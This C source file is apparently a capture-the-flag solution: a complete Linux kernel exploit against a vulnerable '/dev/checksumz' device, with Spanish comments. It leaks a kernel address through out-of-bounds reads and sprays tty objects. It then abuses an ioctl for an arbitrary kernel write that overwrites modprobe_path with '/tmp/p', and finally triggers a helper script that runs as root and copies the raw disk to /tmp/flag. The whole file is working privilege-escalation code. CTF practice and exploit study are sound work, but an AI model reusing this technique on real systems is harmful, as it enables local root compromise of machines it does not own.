#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include "api.h"

int fd;

//######################################################################
//######################################################################

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void pausa() {
    printf("[!] PAUSA - pulsa una tecla.\n");
    getchar();
}

int open_file(char *file, int flags, int verbose){
    // O_RDWR | O_RDONLY | O_WRONLY | O_APPEND | O_CREAT | O_DIRECTORY | O_NOFOLLOW | O_TMPFILE
    int fd = open(file, flags);
    if (fd < 0) {
        fatal("[!] Error al abrir el archivo.");
    } else {
        if (verbose) printf("[*] %s abierto con fd %d.\n", file, fd);
    }
    return fd;
}

void dump_buffer(void *buf, int len) {
    printf("\n[i] Dumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
        printf(" - 0x");
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
        puts("");
    }
}

void setup() {
	system("echo -ne '#!/bin/sh\ncat /dev/vda > /tmp/flag' > /tmp/p");
	system("chmod a+x /tmp/p");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
	system("chmod a+x /tmp/executeme");
	printf("[i] Modprobe Setup done.\n");
}

void finish() {
	system("/tmp/executeme ; cat /tmp/flag");


    // Hacer el archivo /tmp/executeme ejecutable
    system("chmod a+x /tmp/executeme");

    printf("[i] Modprobe Setup done.\n");
}

//######################################################################
//######################################################################

void writeQword(unsigned long addr, unsigned long val) {
    char buf[0x50] = {0};
    unsigned long *p = (unsigned long *)buf;
    p[1] = 0xdeadbeff;
    p[2] = 0;
    lseek(fd, 504, SEEK_SET);
    write(fd, buf, 0x10);
    p[0] = 0; 
    p[1] = addr;
    lseek(fd, 520, SEEK_SET);
    write(fd, buf, 0x10);

    ioctl(fd, CHECKSUMZ_IOCTL_RENAME, &val);
}

#define SPRAY_NUM 200
int ptmx[SPRAY_NUM];

int spray_tty() {
    for (int i = 0; i < SPRAY_NUM; i++) {
        ptmx[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    }
}

//######################################################################
//######################################################################

int main(){
    bind_core(0);
    setup();
     
    // Open vulnerable device
    fd = open_file("/dev/checksumz", O_RDWR, 1);

    spray_tty();
    
    lseek(fd, 504, SEEK_SET);

    char buffer[0x2000]; 
    read(fd, buffer, 0x20);
    dump_buffer(buffer, 0x200);

    unsigned long *p = (unsigned long *)buffer;
    unsigned long base = p[3];
    printf("[i] BASE: 0x%lx\n", base & 0xffffffffff000000);

    memset(buffer, 0, 0x1000);
    p[1] = 0xdeadbeef;
    lseek(fd, 504, SEEK_SET);
    write(fd, buffer, 0x10);

    

    unsigned long kernel_base = 0;
    int offset = 0x400;
    while (1)
    {
        lseek(fd, offset, SEEK_SET);
        memset(buffer, 0, 0x1000);
        read(fd, buffer, 0x200);    
        dump_buffer(buffer, 0x200);

        printf("[i] 0x%lx\n", p[3]);
        if (p[3] > 0xffffffff00000000) {
            kernel_base = p[3];
            //__asm__("int3");
            break;
        }    
        offset += 0x400;
    }
    
    kernel_base = kernel_base - (0xffffffff94c89360 - 0xffffffff93a00000);
    printf("[i] Kernel Base: 0x%lx\n", kernel_base);

    unsigned long modprobe = kernel_base + (0xffffffff9553f100 - 0xffffffff93a00000);
    writeQword(modprobe, 0x0000702f706d742f);
    printf("[i] Modprobe: 0x%lx\n", modprobe);
    
    finish();

    return 0;
}

